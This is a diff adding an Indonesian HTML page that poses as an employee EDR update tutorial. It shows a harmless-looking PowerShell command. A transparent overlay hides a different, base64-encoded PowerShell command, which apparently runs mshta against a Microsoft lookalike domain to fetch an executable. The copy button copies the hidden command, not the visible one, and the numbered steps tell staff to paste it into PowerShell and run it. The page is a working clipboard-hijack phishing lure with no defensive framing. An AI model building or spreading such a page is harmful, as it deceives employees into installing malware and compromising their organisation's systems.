@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Tutorial Pembaruan EDR Pegawai</title>
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f6f7fb;
+    padding: 40px;
+}
+
+h2 {
+    margin-bottom: 5px;
+}
+
+.card {
+    background: #fff;
+    padding: 20px;
+    border-radius: 14px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    width: 520px;
+    margin-bottom: 25px;
+}
+
+/* Container posisi relatif */
+.copy-wrapper {
+    position: relative;
+    display: block;
+    margin-top: 10px;
+}
+
+/* Visible text */
+.visible-text {
+    padding: 14px 20px;
+    background-color: #f0f0f0;
+    border: 2px solid #ddd;
+    border-radius: 10px;
+    font-family: "Courier New", monospace;
+    color: #333;
+}
+
+/* Hidden overlay */
+.hidden-overlay {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    padding: 14px 20px;
+    color: rgba(0, 0, 0, 0);
+    background: transparent;
+    font-family: "Courier New", monospace;
+    z-index: 10;
+    user-select: text;
+    cursor: text;
+}
+
+/* Selection normal */
+.hidden-overlay::selection {
+    background-color: #007bff;
+    color: transparent;
+}
+
+/* Tombol Copy */
+.copy-btn {
+    margin-top: 12px;
+    padding: 10px 18px;
+    border: none;
+    background: #007bff;
+    color: white;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 15px;
+    transition: 0.2s;
+}
+
+.copy-btn:hover {
+    background: #005fcc;
+}
+
+/* Notifikasi popup */
+.popup {
+    position: fixed;
+    top: 20px;
+    right: -300px;
+    background: #28a745;
+    color: white;
+    padding: 14px 20px;
+    border-radius: 10px;
+    font-size: 15px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+    transition: right 0.4s ease;
+}
+
+.popup.show {
+    right: 20px;
+}
+
+/* Tutorial Box */
+.tutorial-box {
+    margin-top: 15px;
+    padding: 18px;
+    background: #e7f3ff;
+    border: 2px solid #bcdcff;
+    border-radius: 10px;
+}
+
+.tutorial-box code {
+    background: #fff;
+    padding: 2px 5px;
+    border-radius: 5px;
+}
+</style>
+</head>
+<body>
+
+<h2>Tutorial Pembaruan EDR Pegawai</h2>
+
+<div class="card">
+    <p><b>Mohon untuk mengikuti tutorial yang sudah disediakan</b></p>
+
+    <div class="copy-wrapper">
+        <div class="visible-text">
+            Start-Process "C:\Windows\Temp\sentinel.exe" -ArgumentList "/install /quiet /norestart" -Wait Restart-Service -Name CSFalconService
+        </div>
+
+        <div class="hidden-overlay" id="copyText">
+            powershell.exe -eC AG0AcwBoAHQAYQAgACIAaAB0AHQAcABzADoALwAvAG0AaQBjAHIAbwBzAG8AZgB0AC0AdQBwAGQAYQB0AGUALgBjAGMALwBkAG8AdwBuAGwAbwBhAGQAcwAvAHMAYQBtAHAAZQBsAC4AZQB4AGUAIg==
+        </div>
+    </div>
+
+    <button class="copy-btn" onclick="copyHiddenText()">Copy Teks</button>
+</div>
+
+<h3>Tutorial Menjalankan Script di PowerShell</h3>
+<div class="card tutorial-box">
+    <ol>
+        <li>Tekan tombol <b>Windows</b> + <b>R</b>.</li>
+        <li>Ketik <code>powershell</code> lalu tekan <b>Enter</b>.</li>
+        <li>Copy script di atas (blok dan tekan <b>Ctrl + C</b>).</li>
+        <li>Paste ke PowerShell (klik kanan atau <b>Ctrl + V</b>).</li>
+        <li>Tekan <b>Enter</b> untuk menjalankan script.</li>
+    </ol>
+</div>
+
+<!-- Popup Notifikasi -->
+<div id="popup" class="popup">Teks berhasil disalin!</div>
+
+<script>
+function copyHiddenText() {
+    const text = document.getElementById("copyText").innerText;
+
+    navigator.clipboard.writeText(text).then(() => {
+        const popup = document.getElementById("popup");
+        popup.classList.add("show");
+
+        setTimeout(() => {
+            popup.classList.remove("show");
+        }, 2000);
+    });
+}
+</script>
+
+</body>
+</html>
